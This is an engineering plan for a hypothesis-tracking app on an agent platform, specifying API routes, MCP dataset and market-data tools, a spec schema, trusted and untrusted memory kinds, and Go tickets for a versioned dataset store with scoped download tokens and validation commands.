`404 not found` for absent, malformed and other-project alike; `410` when the row exists but the
blob is gone; `501` off Postgres; `403` when the credential names no project. Byte responses set
`Content-Type` from the row, `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment`.

### Memory append route (O7) — the trust anchor

```http
POST /agent/memories
X-API-Key: $WOLF_API_KEY
Content-Type: application/json

{ "labels": {"kind":"hypothesis","name":"1a2b3c4d","status":"live","owner":"kai-at-badcode.dev"},
  "content": "…", "embed": false }
```

```json
{ "id": "…", "labels": {…}, "content": "…",
  "created_by_worker": "", "created_by_session": "", "created_at": 1755600000000 }
```

**Invariants, all of which are tests:**

- **Provenance is server-stamped EMPTY and the request body cannot influence it.** A body
  containing `created_by_worker` or `created_by_session` is rejected `400`, not ignored — silently
  dropping them would leave a caller believing it set them.
- Accepts **project API key or console JWT only**. A session token or an embed token is `403`:
  a credential that reaches a container must never be able to mint trusted state.
- Project comes from the credential; there is no project field.
- Labels go through the existing validator; a bad label is `400` with the validator's own message.
- `embed` defaults to `true`; content over 24KB with `embed: true` is `400` naming the
  `embed: false` remedy, matching `memory_create`'s behaviour. Hard ceiling 1MB.
- `501` when the memory store is not Postgres.
- Writes **no config event** — a memory is data, not configuration.

### Dataset MCP tools (O6b)

```
dataset_list(selector?: string, limit?: number)
  → { datasets: [{ name, version, size_bytes, row_count, sha256, content_type,
                   labels, created_at, created_by_worker, created_by_session }] }
    Metadata only, never bytes. limit default 20, max 100.

dataset_get(name: string, version?: number)
  → { name, version, size_bytes, row_count, sha256, content_type, labels,
      download_url, expires_at }
    download_url is built on AGENTKIT_SELF_URL and carries a scoped token in `token=`.
    Tool description MUST instruct: curl it to a file; do not echo the URL; do not
    print the file's contents.

dataset_put(name: string, path: string, if_version: number,
            labels?: object, content_type?: string, allow_shrink?: boolean)
  → { name, version, size_bytes, row_count, sha256 }
    path is relative to /workspace and must not escape it after normalisation.
    if_version must equal the current version; 0 means "must not exist".
    A conflict is an error naming the current version so the model can re-read and retry.
    Refuses a replacement with row_count < 50% of current unless allow_shrink is true.
```

### Market-data MCP tools (W7)

```
series_search(query: string, source?: "fred" | "stooq")
  → { results: [{ source, id, title, unit, frequency, first, last }] }

series_fetch(source: "fred"|"stooq", id: string, from?: string, to?: string)
  → { download_url, expires_at, rows, unit, source, id }
    CSV: header `timestamp,value`; RFC3339 UTC; ascending; no gap filling; no interpolation.
```

Authenticated by `WOLF_MCP_TOKEN`, a credential distinct from `WOLF_API_KEY`, reaching the
container through `AGENTKIT_MCP_ENV` (see O8).

### Wolf API routes

```
POST   /api/auth/google                     { credential } → session cookie
GET    /api/auth/me                         → 200 { email } signed in | 401 not signed in.
                                              The ONLY way the UI learns who it is; W13 must not
                                              infer it from a 401 on the board. Owner decision
                                              2026-08-21, R100 — see W8b
POST   /api/auth/logout                     → 204, clears the wolf_session cookie. POST, not GET,
                                              so a prefetch or an <img> cannot sign a user out.
                                              Owner decision 2026-08-21, R100 — see W8b
GET    /api/hypotheses                      → [{ id, title, owner, status, support_score,
                                                 conditions_summary, updated_at, tamper? }]
POST   /api/hypotheses                      { title } → { id }
GET    /api/hypotheses/:id                  → { hypothesis, spec, evaluation, notes,
                                                amendments, verdict, atoms }
POST   /api/hypotheses/:id/go-live          → 200 | 422 { errors: [{path, message}] }
POST   /api/hypotheses/:id/amend            { amendment_id, decision, rationale }
POST   /api/hypotheses/:id/verdict          { verdict, rationale }
POST   /api/hypotheses/:id/retire           { rationale }
GET    /api/hypotheses/:id/embed-token      → { token, expires_at_sec }
GET    /api/hypotheses/:id/series/:metric   → { points:[{tMs,v}], unit, version, fetched_at_ms,
                                                state }
GET    /api/hypotheses/:id/report/frame     → text/html, the sandboxed report document
POST   /api/hypotheses/:id/report-template  { html } → 201 { structure_hash } | 409 | 422
POST   /api/hypotheses/:id/report-amendment { amendment_id, decision, rationale }
POST   /mcp                                 → market-data MCP (X-Wolf-Mcp-Token)
POST   /api/auth/dev-login                  { email } → session cookie. Mounted ONLY when
                                              WOLF_TEST_LOGIN is set; see owner decision B6
```

Units in these routes follow § "Shared shapes": `expires_at_sec` is unix **seconds** because that
is what Orange returns, and `tMs`/`fetched_at_ms` are unix **milliseconds**. An earlier draft wrote
`expires_at` and `{t,v}`, which is the exact ambiguity that would give W13 a token that either
never refreshes or refreshes instantly.

`GET /api/hypotheses/:id` additionally returns `spec_validation: { valid, errors[] }` — W13's Go
Live button needs the blocking reasons *before* the click, and the only other validator output is
W9's 422 *after* it.

### Spec JSON (W3)

```jsonc
{
  "thesis": "…restated tightly by the interviewer…",
  "horizon_days": 180,
  "flat_band_pct": 2.0,
  "metrics": [
    { "slug": "drone-suppliers-basket", "source": "stooq", "series_id": "avav.us",
      "direction": "up", "weight": 0.6, "unit": "USD" },
    { "slug": "petro-settlement-share", "source": "derived", "direction": "down",
      "weight": 0.4, "unit": "pct",
      "method": { "description": "share of oil trade settled in USD",
                  "formula": "usd_settled / total_settled * 100",
                  "constituents": ["…"], "source_series": ["…"] } }
  ],
  "invalidation": [ /* condition objects — see § Condition semantics */ ]
}
```

⚠️ **The block above is illustrative, not a fixture.** Its `invalidation` value is a comment, so it
is not parseable JSON, and an empty `invalidation` array would violate the rules below in any case.
W3 ships a real, rule-satisfying worked example as a committed fixture and asserts it validates —
a verifier copying the block above verbatim would fail the ticket through no fault of its own.

**Validation rules (all of them, W3):** at least one metric; every metric slug unique, label-legal
and ≤ `63 − len("hyp-") − 8 − 1 = 50` characters; weights sum to `1.0 ± 0.001`; each weight in
`(0, 1]`; `horizon_days` in `[7, 3650]`; `flat_band_pct` in `[0, 50]`; a non-`derived` metric has
`series_id`; a `derived` metric has `method` with a non-empty `description` and `formula`, and no
`series_id`; at least one invalidation condition; every condition's `metric` (and `ratio_metric`)
names a metric in this spec; `ratio_metric` present iff `stat == "ratio_to"`; `reference_days`
present iff `reference == "trailing_n_days"` and then in `[2, 365]`; `sustained_days` in
`[0, 365]`; `threshold` finite; at least one condition per metric carrying weight ≥ 0.25;
`ratio_lookback_days` present iff `stat == "ratio_to"` and then in `[1, 400]`;
`staleness_days` (spec level, default `5`) in `[1, 90]`.
Errors are returned **all at once**, each with its JSON path.

### Shared shapes that four or more tickets must agree on (A6, A7)

Each of these was used by several tickets and defined by none. They are pinned here, once.

```ts
// The unit lives in the NAME. This is the plan's own rule and it was broken in six places.
type UnixMs  = number;   // memories, datasets, evaluations, reports
type UnixSec = number;   // Orange sessions, embed-token expiry

interface Point { tMs: UnixMs; v: number }        // W4, W11, W14, and the report frame

// W4 produces this whole object; W8, W10, W11 and W14 all read it.
// W14 needs per-metric direction, realised change and staleness, which no earlier
// draft produced — W14 was literally unbuildable without this.
interface EvaluationResult {
  evaluated_at_ms: UnixMs;
  support_score: number;                 // −1 … +1
  conditions: ConditionResult[];
  metrics: {
    slug: string;
    direction: "up" | "down" | "flat";   // expected, from the spec. "flat" is legal — a
                                          // hypothesis may predict no change, and § "The support
                                          // score" already scores it. Owner decision 2026-08-21,
                                          // R65.
    realised_change_pct: number | null;   // null when indeterminate
    last_observation_ms: UnixMs | null;
    stale: boolean;
    stale_reason: Reason | null;         // the closed vocabulary W4 exports, never a free
                                          // string; the stale value is `stale_data`. R67.
  }[];
}

// W5 writes it; W8, W13, W14 and X1 read it. A bare string cannot distinguish a
// forged row from a hostile retraction, and X1 asserts on both attacks separately.
interface Tamper {
  reason: "forged_row" | "hostile_retraction" | "cross_hypothesis_write";
  written_by_worker: string;             // "" if a session wrote it
  written_by_session: string;            // "" if a worker wrote it
  memory_id: string;
}
```

**Embed-token expiry is `expires_at_sec`.** Orange returns unix **seconds**; W13 computes a T-120s
refresh. Mixing the units gives a token that either never refreshes or refreshes instantly, and
neither ticket's own test would catch it.

#### The MCP server name and its auth header

Server name is **`wolf`**, so tools are `mcp__wolf__series_fetch` and friends — the researcher
prompt, X1's mock-model script and W7 must all use that exact form.

The header is **`X-Wolf-Mcp-Token`**, carrying the **bare token** with no scheme.

⚠️ **`Authorization: Bearer ${WOLF_MCP_TOKEN}` cannot work.** Orange rejects partial interpolation
of MCP header values (`go/agentdb/sessions.go:79-90`) — a header value is either a whole `${VAR}`
reference or a literal, never a mix. W7 would build a `Bearer` header, W12 could only send a raw
value, both tickets' tests would pass, and X1 would fail with a 401 raised inside a container.

### Memory kinds (the Wolf vocabulary, all in the `wolf` Orange project)

| Kind | Labels | Content | Trusted |
| --- | --- | --- | --- |
| `hypothesis` | `kind=hypothesis, name=<id>, status=<state>, owner=<slug>` | **Line 1 is the title**, then the prose thesis, then (for `challenged`/terminal rows) the evaluation snapshot as fenced JSON | **Yes** |
| `hypothesis-spec` | `kind=hypothesis-spec, name=<id>, status=locked` | The spec JSON | **Yes** |
| `verdict` | `kind=verdict, name=<id>, status=confirmed\|invalidated` | Rationale, deciding user, evaluation snapshot | **Yes** |
| `evaluation` | `kind=evaluation, name=<id>` | **Line 1 is the summary line** (see § "Where the board's numbers come from"), then the full evaluation snapshot as JSON | **Yes** |
| `report-template` | `kind=report-template, name=<id>, status=locked` | Line 1 is `structureHash`; then the template HTML fragment | **Yes** |
| `research-note` | `kind=research-note, name=<id>` | Daily prose + per-metric reads | No |
| `spec-amendment` | `kind=spec-amendment, name=<id>, status=proposed` | Proposed change + rationale | No |
| `hypothesis-spec-candidate` | `kind=hypothesis-spec-candidate, name=<id>` | Line 1 is a summary; then the proposed spec JSON | No |
| `report-candidate` | `kind=report-candidate, name=<id>` | Line 1 is a summary; then the proposed template HTML | No |
| `report` | `kind=report, name=<id>` | Line 1 is the headline (≤400 characters); then `{slotId: html}` as JSON | No |
| `report-amendment` | `kind=report-amendment, name=<id>, status=proposed` | Line 1 is a rationale; then the proposed template HTML | No |

**The two candidate kinds are the transport across the container boundary.** An interview runs
inside a container and its proposed spec and proposed report have to reach the human who approves
them. Nothing in an earlier draft carried them, which left W8, W9, W12 and W13 incoherent. Both are
untrusted by construction; approval is what makes the trusted twin.

Line 1 as the title is not stylistic: `GET /agent/memories` returns a **500-byte snippet** and no
`content` field, so the board must render from snippets alone or pay a read per hypothesis.

`restated_from=<other-id>` is an optional extra label on a `hypothesis` memory, set when a user
creates a hypothesis that restates a retired one. It exists so the Archive page can show that a
"new" thesis is a re-roll of a failed one — without it, archiving and relaunching is a free
scoreboard reset and survivorship bias walks in through the back door.

---

## Out of Scope

- **Trade execution, brokerage, portfolio tracking, position sizing.** Wolf judges theses.
- **Backtesting.** Validation is forward-looking from go-live.
- **A Wolf database.** No relational store, no ORM, no migrations in the Wolf repo.
- **Running wolf-api as more than one replica.** Transition serialisation is in-process.
- **Any change to `web/`'s packaging.**
- **Fixing Orange hazards H1–H13** (`docs/19-embedding.md`). H1 — an embed token carrying
  project-wide authority — is accepted, mitigated by 900s TTLs and a trusted-team audience.
- **Multi-tenant isolation between Wolf users.** One `wolf` project; everyone sees everything.
- **A notifications system.** `request_human_attention` posts to the project's attention channel.
- **Retention policy for concluded hypotheses.**
- **Sub-daily ticks, intraday data, or any provider beyond FRED and Stooq.**

---

## Tickets

27 tickets: **O1–O11** (O6 split into O6a/O6b) in agent-orange (front-loaded — Wolf's data path *and* its state path both
depend on them), **W1–W14** in agent-wolf, **X1** spanning both.

W1, W3 and W6 have no Orange dependency and may start immediately in parallel.

---

### O1: Dataset table, migration and type   [Status: done | Model: sonnet]
- **Scope:** Add migration `045_datasets` exactly as written in **Interfaces**, plus the
  `Dataset` struct, `ErrDatasetNotFound`, `ErrDatasetVersionConflict` and column mapping. No
  store methods yet.
- **Repo:** agent-orange
- **Files:** modify `go/agentdb/migrations.go` (append after `044_agent_sessions_launch_image`,
  `:1045`); create `go/agentdb/datasets.go`.
- **Acceptance criteria:**
  - The migration applies cleanly on a fresh database and is idempotent on re-run.
  - `Dataset.Labels` is the existing `LabelSet` type, so the shared validator and jsonb
    translator apply unchanged. No new label code.
  - `CreatedAt` carries a comment stating unix **milliseconds**, and cites `memories` as the
    precedent.
  - Dataset names are validated by the existing label-value helper in `go/agentdb/labels.go`.
    Do not write a second regex.
  - `ErrDatasetVersionConflict` is a struct carrying `Current int`, not a sentinel — the caller
    must be able to report the version it should have passed.
- **TDD:** no (schema + type declaration).
- **Validation:** `cd go && go build ./... && go vet ./...`
- **Depends on:** —
- [x] done
- Notes: **Implemented and verified 2026-08-20.** Branch `O1-dataset-table-migration`, commit
  `2bda0e8` (136 lines: `go/agentdb/migrations.go`, `go/agentdb/datasets.go`). Verified by an
  independent adversarial agent: build and vet clean; `TestLivePG_MigrationsApplyAndAreIdempotent`
  **PASS** against the throwaway (criterion 1 is not provable by the ticket's own Validation — see
  **R35**); `-run 'Live'` gave 72 PASS and **zero SKIP**.
  Executor decisions the plan did not specify: migration SQL uses `IF NOT EXISTS` (**R34**);
  `ValidateDatasetName` added as a standalone helper wrapping `ValidateLabelValue` because O1 has
  no store method to call it from; `ErrDatasetVersionConflict.Error()` uses a **value** receiver,
  so O2 returns it as `ErrDatasetVersionConflict{Current: n}`, not a pointer; `id` is `TEXT` per
  Interfaces rather than the older tables' `VARCHAR(36)`; no gorm `default:` tags, per migration
  042's stated convention.

### O2: Dataset store — versioned writes under compare-and-swap   [Status: done | Model: opus]
- **Scope:** `CreateDatasetVersion`, `CurrentDataset`, `GetDatasetVersion`. The whole difficulty
  is that the next version number and the CAS check must be decided inside **one transaction**,
  or two concurrent writers both produce version N+1.
  **Test names are pinned, so the Validation filter and the code cannot drift.** Every test this
  ticket adds is named `TestDataset…`, and every test that needs a real Postgres is named
  `TestDatasetLivePG_…`. `agentdb` already carries four incompatible live-test naming shapes
  (`TestLivePG_MigrationsApplyAndAreIdempotent`, `TestConfigEvents_LivePG_Migration026`,
  `TestWorkersLivePG_SchemaDefaults`, `TestMemoriesLiveCreateAndGet`); adopting any of them makes
  `-run 'TestDataset'` match nothing, so the run prints `ok` while this ticket's central
  criterion never executes.
  **The split between the two test files is dictated by the dialect, not by taste.** `agentdb`'s
  unit stores are sqlite (`go/agentdb/artifacts_test.go:15`) and the dataset write path uses
  `?::jsonb` casts, so `datasets_test.go` holds only what runs without SQL — argument validation,
  the error values, `ErrDatasetVersionConflict.Error()` — and `datasets_live_test.go` holds
  everything that touches the table.
  Reuse `isUniqueViolation` (`go/agentdb/customimages.go:418`) rather than matching driver strings
  a second time; `nextCustomImageVersion` (`go/agentdb/customimages.go:405-414`) is the
  high-water-mark precedent to follow.
  **Do not declare `DatasetBlobPrefix`, `DatasetBlobDeleter` or `DatasetBlobLister` here** — O3
  owns all three, and adding them now guarantees a conflict in the one file three tickets share.
  R34 applies: Interfaces SQL means "these columns, types, defaults and constraints", not a
  byte-for-byte transcription.
- **Repo:** agent-orange
- **Files:** modify `go/agentdb/datasets.go`; create `go/agentdb/datasets_test.go`,
  `go/agentdb/datasets_live_test.go`.
- **Acceptance criteria:**
  - `CreateDatasetVersion(ctx, d, ifVersion)` returns `ErrDatasetVersionConflict{Current: n}` — a
    **value**, not a pointer, because O1 gave `Error()` a value receiver — whenever `ifVersion`
    differs from the current version `n`, where `n == 0` means the name does not exist in that
    project.
  - `ifVersion == 0` succeeds only when `(project, name)` has no row. `ifVersion < 0` is an
    argument error, never a conflict.
  - Versions start at 1, are strictly monotonic per `(project, name)` and have no gaps: the row
    written at `ifVersion == n` carries `version == n+1`.
  - **Two concurrent writers at the same `ifVersion`: exactly one succeeds.** Asserted with real
    goroutines against real Postgres, never mocked. The loser's error is found by `errors.As` as
    an `ErrDatasetVersionConflict`, and afterwards exactly one row exists at that version.
  - The unique index on `(project, name, version)` is the backstop. A violation surfaces as
    `ErrDatasetVersionConflict` carrying the re-read current version, never as a raw driver error
    and never as a bare "duplicate key" string.
  - Reads and writes bind `project` first, in code, always. `CurrentDataset` and
    `GetDatasetVersion` answer `ErrDatasetNotFound` for a name that exists only in another
    project — the same answer as absent, so neither is an existence oracle (the posture
    `go/httpapi/memories.go`'s `memoryNotFound` states for memories).
  - `row_count` is stored exactly as the caller supplied it: the store never parses CSV, agentd
    counts it (O6a). A negative `RowCount` is rejected as an argument error, because the column is
    `NOT NULL DEFAULT 0` and O6b's 50% shrink guard divides by it.
  - The store fills three fields when, and only when, the caller left them zero: `ID` becomes
    `"ds-" + uuid4` (the form § "Dataset metadata JSON" shows, and the one O5 and W2 will read),
    `CreatedAt` becomes `time.Now().UnixMilli()`, `ContentType` becomes `text/csv`.
  - Rejected before any database round-trip, each with its own row in the table test: empty
    `Project`; a name that fails `ValidateDatasetName` (O1); labels that fail `ValidateLabels`;
    empty `SHA256`; empty `BlobPath`; negative `SizeBytes`; negative `RowCount`; `ifVersion < 0`.
  - **Argument validation runs before the dialect check**, which is why that table test can drive
    the sqlite unit store. `CreateMemory` checks the dialect first (`go/agentdb/memories.go:142`);
    datasets deliberately do not, because "this dataset name is illegal" is a more useful answer
    than "this deployment is not Postgres", and because it is what makes the rejection cases
    provable without a live instance. Past validation, every method here guards the dialect and
    returns a new **`ErrDatasetRequiresPostgres`** sentinel — declared by O2 and reused by O3 and
    O5 — modelled on `requirePostgres` (`go/agentdb/memories.go:576-581`). It is a dataset
    sentinel and not the memory one, so a 501 raised on a dataset route does not blame memories.
  - **No config event is written, and none is expected** — a dataset is data, not configuration.
    No method added here may contain one of `configEntityNouns`
    (`Worker Project Setting Prompt Subscription Schedule Image Skill Config Topology`,
    `go/agentdb/config_events_test.go:565-568`), or `TestMutationsAreLogged` demands a
    registration that must not exist.
- **TDD:** yes.
- **Validation** — start the throwaway instance first (§ "The throwaway Postgres"), export
  `AGENTKIT_TEST_POSTGRES_URL`, and run all five. The store is Postgres-only (jsonb + a unique
  index under concurrency), so the sqlite path can prove nothing about CAS:
  - `cd go && go build ./... && go vet ./...`
  - `cd go && go test ./agentdb/... -run 'TestDataset' -count=1`
  - `cd go && go test ./agentdb/... -run 'TestDatasetLivePG' -count=1 -v | grep -E '^--- (PASS|SKIP|FAIL)'`
    — must print **at least five `--- PASS`** and **zero `--- SKIP`**. A `SKIP` means the URL did
    not reach the test and the concurrency criterion is unproven; *no output at all* means the
    name filter matched nothing, which is the same failure wearing a different hat.
  - `cd go && go test ./agentdb/... -count=1` — the whole package, URL still exported, to prove
    nothing that already worked broke.
  - `cd go && go test ./agentdb/... -run 'TestMutationsAreLogged' -count=1 -v | grep -E '^--- (PASS|FAIL)'`
    — one `--- PASS`. It lives in `go/agentdb/config_events_test.go`, not in `cmd/agentd`.
- **Depends on:** O1
- [x] done
- Notes: **Delivered on branch `O2-dataset-store-cas`, commit `ae6a85e`, based on
  `O1-dataset-table-migration` (O1 is not merged to `main`).** Orchestrator re-ran all five
  Validation commands on 2026-08-21: build+vet clean, `TestDataset` green, the live filter prints
  **8 `--- PASS` and zero `--- SKIP`**, `TestMutationsAreLogged` passes, whole `agentdb` package
  green (92s).
  Two implementation facts later tickets depend on. **(1)** The unique-violation re-read happens
  *outside* the failed transaction — Postgres aborts a transaction on a constraint violation
  (25P02), so an executor who re-reads the current version inside it gets an opaque
  "current transaction is aborted" instead of a conflict. An unexported `errDatasetVersionTaken`
  unwinds the tx, then `currentDatasetVersion` re-reads on a fresh connection and the exported
  `ErrDatasetVersionConflict{Current: n}` is built outside. **(2)** The store fills its three
  defaults on a **copy**, never on the caller's struct — O6a must use the *returned* value, not
  its own input, or it reads zeros for `ID` and `CreatedAt`.
  Also pinned here for O3/O5/O6b: the dialect guard is `(*Store).requireDatasetPostgres`; argument
  errors are worded `agentdb: dataset …` and use the **snake_case wire spelling** `if_version`;
  `GetDatasetVersion` treats `version < 1` as an argument error (400), not `ErrDatasetNotFound`;
  and both read methods validate the name before the dialect guard, so an illegal name is a 400
  rather than a 404. A package-level `datasetColumns` const holds the projection — O3 should reuse
  it rather than re-listing columns. Test helpers O3 will meet: `validDataset()` and
  `newTestStore` (sqlite) in `datasets_test.go`; `newLiveDatasetProject(t,s)` and
  `liveDataset(project,name)` in `datasets_live_test.go`. **`datasets` rows hang off no FK, so
  nothing cascades — O3 must keep the explicit DELETE-by-project cleanup** or the throwaway
  instance accumulates rows that break `ListDatasets` assertions.
  Surprises logged: **R57** (the goroutine race alone almost never reaches the unique-index
  backstop, so the ticket's own Validation cannot tell a correct CAS from a lucky one — the
  deterministic provocation is described there), **R58** (`grep '^--- '` matches only top-level
  tests, so a ticket graded on a PASS count silently forbids subtests) and **R61** (a pre-existing
  file is not gofmt-clean).

### O3: Listing, version history, reaper and orphan sweep   [Status: done | Model: sonnet]
- **Scope:** `ListDatasets`, `ListDatasetVersions`, `ReapDatasetVersions`, `ListOrphanBlobPaths`,
  plus the three declarations the byte plane needs: `DatasetBlobPrefix`, `DatasetBlobDeleter` and
  `DatasetBlobLister`. O3 owns all three; O2 was told not to add them, and O6a/O8 reference O3's.
  **`agentdb` MUST NOT import `extension`** — `go/extension/extension.go:12` imports `agentdb`,
  so the reverse is a compile-time cycle. That is why the two blob seams are single-method
  interfaces declared here; `extension.BlobStore` satisfies both structurally and agentd passes
  one in.
  Retention is an **env knob only** — do NOT add a project setting; `ProjectSettings` is a typed
  struct whose columns need their own migration and console surface, and that is a separate
  feature.
  Test names follow O2's rule exactly: `TestDataset…`, and `TestDatasetLivePG_…` for anything
  needing a real Postgres. Every method here except the reaper's row deletion touches jsonb or a
  selector, so nearly all of this ticket's coverage lives in `datasets_live_test.go`.
- **Repo:** agent-orange
- **Files:** modify `go/agentdb/datasets.go`, `go/agentdb/datasets_test.go`,
  `go/agentdb/datasets_live_test.go`.
- **Acceptance criteria:**
  - The three declarations exist in `go/agentdb/datasets.go`, exactly as § "The blob namespace"
    and § "Go store signatures" pin them — `const DatasetBlobPrefix = "_datasets/bytes/"`, and the
    two single-method blob seams `DatasetBlobDeleter` (`Delete(ctx, key string) error`) and
    `DatasetBlobLister` (`List(ctx, prefix string) ([]string, error)`), both taking a
    `context.Context` first. A comment states why the prefix is load-bearing: agentd runs **one
    global `BlobStore`** (`go/cmd/agentd/backends.go:59-76` returns `Global("")`) shared with
    `_artifacts/bytes/` and with snapshots, so an empty or wrong prefix enumerates every artifact
    and snapshot blob in the deployment for deletion.
  - `ListDatasets` reuses `LabelSelectorSQL` (`go/agentdb/labels.go:437`). No second parser. On a
    non-Postgres dialect it returns O2's `ErrDatasetRequiresPostgres` — never a silently empty
    result, which is how a caller reads "no datasets match" out of "this deployment cannot
    answer". Do not declare a second sentinel; O2 owns that one.
  - `ListDatasets` returns **at most one row per `(project, name)` — always the highest
    `version`** — and the selector is evaluated against **that row's labels only**, never against
    a superseded version's. Labels are per-version, so this is the case that separates three
    plausible implementations and it is a required test: name `d` with v1 labelled `hyp=h1` and
    v2 unlabelled is **not** returned by selector `hyp=h1`; relabelling at v3 brings it back.
  - Both list methods clamp `limit` in the store, with the house numbers memories already use
    (`defaultMemorySearchLimit`/`maxMemorySearchLimit`, `go/agentdb/memories.go:36-37`):
    `limit <= 0` becomes 20, `limit > 100` becomes 100.
  - `ListDatasets` orders `created_at DESC, name ASC`; `ListDatasetVersions` orders
    `version DESC`. Both tiebreaks are asserted, because `created_at` is milliseconds and two
    writes in the same millisecond must still come back in a stable order.
  - `ListDatasetVersions` for a name with no rows in that project returns `ErrDatasetNotFound`,
    not an empty slice — O5's versions route needs to answer 404 rather than "exists, but empty".
  - The reaper **never** deletes the highest version of any name, whatever the retention number.
    `keepPerName <= 0` deletes nothing and returns `(0, nil)`, meaning "keep everything"; the
    store does not log it (agentdb has no logger — O8 logs at boot), and a criterion is that it
    prints nothing.
  - The reaper deletes the **blob before the row**. A `Delete` error leaves that row intact, stops
    work on that name, and returns a non-nil error naming the blob path; the returned count is
    what was actually deleted, so the next sweep retries the same version. There is a test with a
    `DatasetBlobDeleter` whose `Delete` fails.
  - A **nil** `DatasetBlobDeleter` is refused with an error, never treated as a row-only sweep.
    Deleting rows without their blobs manufactures exactly the orphans `ListOrphanBlobPaths`
    exists to clean up.
  - Every path handed to `Delete` is re-checked against `DatasetBlobPrefix` immediately before the
    call — belt and braces, deliberately. A row whose `blob_path` lacks the prefix is skipped and
    counted as skipped, never deleted.
  - `ListOrphanBlobPaths(ctx, blobs, minAge)` calls `blobs.List(ctx, DatasetBlobPrefix)`,
    subtracts every `blob_path` present in the `datasets` table **for any project** (an orphan is
    orphaned globally; filtering by project would propose deleting another project's live bytes),
    re-asserts the prefix on each survivor, and returns the remainder. It returns an **empty,
    non-nil slice** — never an error, never the *known* set, which is the exact inverse of the
    name — when the lister returns nothing. Two tests: three keys under the prefix with rows for
    two returns exactly the third; an `_artifacts/bytes/…` key in the lister's answer is never
    returned.
  - **`minAge` is accepted and does not filter, and the doc comment says so in one sentence.**
    `DatasetBlobLister.List` returns keys and no timestamps, so blob age is not knowable inside
    `agentdb`. The returned paths are therefore **candidates**: the "a pull in flight has written
    bytes but not yet its row" guard belongs to O8's sweep, which must see a path unreferenced
    across two passes at least `minAge` apart before deleting it. A test pins the inertness rather
    than leaving it accidental — the same three-key fixture returns the same answer for
    `minAge = 0` and `minAge = time.Hour`.
- **TDD:** yes.
- **Validation** — start the throwaway instance first (§ "The throwaway Postgres"), export
  `AGENTKIT_TEST_POSTGRES_URL`, and run all five:
  - `cd go && go build ./... && go vet ./...`
  - `cd go && go test ./agentdb/... -run 'TestDataset' -count=1`
  - `cd go && go test ./agentdb/... -run 'TestDatasetLivePG' -count=1 -v | grep -E '^--- (PASS|SKIP|FAIL)'`
    — must print **at least six `--- PASS`** and **zero `--- SKIP`**. A `SKIP` means the URL did
    not reach the test; empty output means the filter matched nothing.
  - `cd go && go test ./agentdb/... -count=1` — the whole package, URL still exported.
  - `cd go && ! go list -deps ./agentdb | grep -q 'badcode-agent-orange/extension$'` — exits 0
    only while `agentdb` is free of `extension`. `go build` would fail on the cycle too, but this
    one says which rule was broken.
- **Depends on:** O2
- [x] done
- Notes: **Delivered on branch `O3-dataset-listing-reaper`, commit `c0aee15`, based on
  `O2-dataset-store-cas`. No fix round.** Orchestrator re-ran the Validation on 2026-08-21:
  build+vet clean, the live filter prints **17 `--- PASS` and zero `--- SKIP`** (O2's 8 plus 9 new),
  `TestMutationsAreLogged` passes, `agentdb` does not import `extension`, and all three files are
  `gofmt`-clean.
  **Three semantics O8 must match, none of which the plan pinned.** (1) **The reaper continues
  after a blob-delete failure.** One name's failed `Delete` halts only *that* name's remaining
  excess versions; every other `(project, name)` group is still reaped, and the call returns the
  real deleted count alongside the **first** error. A row-DELETE SQL failure is treated as more
  severe and aborts the whole sweep. The alternative reading — abort everything on the first blob
  failure — is defensible from the same sentence, so **if O8's retry logic assumes it, this is
  where they disagree.** (2) Candidates are visited `ORDER BY project, name, version ASC`, oldest
  excess first; that determinism is what makes the partial-failure test reproducible. (3)
  `ListOrphanBlobPaths` builds its known set from `SELECT DISTINCT blob_path FROM datasets` with
  **no WHERE clause at all** — so a row somehow written with a non-prefixed `blob_path` is still
  recognised as known and never reported as an orphan, rather than being excluded from the known
  set and looking orphaned by construction.
  R47 needed nothing further: the ticket text already decided it. `minAge` is **accepted and does
  not filter**, the doc comment says so, and a test pins the inertness by asserting identical
  results for `minAge=0` and `minAge=time.Hour`. **The safety lives at the O8 caller**, which must
  see a path in the orphan list across two passes at least `minAge` apart before deleting it.
  `ListDatasets` reduces to one row per `(project, name)` at the highest version in an inner query
  scoped only by project, then applies the label selector to *that* row's labels — so a superseded
  version's labels can never decide whether the current version matches. New shared helper in this
  file: `clampDatasetListLimit`.

### O4: Scoped dataset download tokens   [Status: done | Model: sonnet]
- **Scope:** A short-TTL token carrying `scope: "dataset:<project>/<name>"`, minted server-side,
  and the verification function that accepts it. Model it directly on
  `go/cmd/agentd/embedtoken.go`: same signing secret (`AGENTKIT_JWT_SECRET`), same
  deliberately-empty `sid` claim, same clamp-never-reject TTL treatment. Default 300s, clamped to
  `[60, 900]`.
  **The scope value and its parser are siblings of `SessionScope`/`ParseSessionScope` and live
  beside them in `go/extension/devclaims/devclaims.go`** — that file's comment at `:45-46` already
  anticipates "a later kind of scope", and putting them anywhere else would either duplicate the
  prefix string or strand it in `package main`, which `go/httpapi` cannot import. Only the mint
  helper and the signature-and-expiry check live in `go/cmd/agentd/datasettoken.go`; O5 calls
  `verifyDatasetToken` from agentd's middleware, never from `go/httpapi`, which stays free of JWT
  code.
  ⚠️ **§ "File Structure" still describes this file as minting `scope: "dataset:<id>"`. That row
  is stale and must not be followed.** A dataset `id` is a per-**version** uuid, so pinning it
  would break the Interfaces guarantee that "a URL minted before a tick still resolves to that
  name's requested version after it" — the exact failure the pin exists to prevent.
  Every test this ticket adds under `go/cmd/agentd` is named `TestDatasetToken…`; every test it
  adds under `go/extension/devclaims` is named `TestDatasetScope…`. The Validation filters on
  exactly those prefixes, and an unanchored `-run` that matches nothing still exits 0.
- **Repo:** agent-orange
- **Files:** create `go/cmd/agentd/datasettoken.go`, `go/cmd/agentd/datasettoken_test.go`; modify
  `go/extension/devclaims/devclaims.go`, `go/extension/devclaims/devclaims_test.go`.
- **Acceptance criteria:**
  - `devclaims` gains, beside its session equivalents: `const datasetScopePrefix = "dataset:"`,
    `func DatasetScope(project, name string) string`, and
    `func ParseDatasetScope(scope string) (project, name string, ok bool)`.
    `DatasetScope("wolf", "1a2b3c4d-drone-suppliers-basket")` is exactly
    `"dataset:wolf/1a2b3c4d-drone-suppliers-basket"` — asserted as a literal string, because O5
    verifies what O6b mints and a whitespace or separator drift between them is invisible until
    an agent's `curl` 401s inside a container.
  - **The two scope families can never be confused, asserted both ways:** `ParseDatasetScope`
    returns `ok=false` for a `session:…` scope, for the empty scope, for `"dataset:"` with
    nothing after it, for a value with no `/`, for an empty project half and for an empty name
    half; and `ParseSessionScope` returns `ok=false` for any `dataset:…` value. Project and name
    are split on the **first** `/`; a value containing a second `/` is `ok=false`, since both
    halves are label-charset and neither can legally contain one.
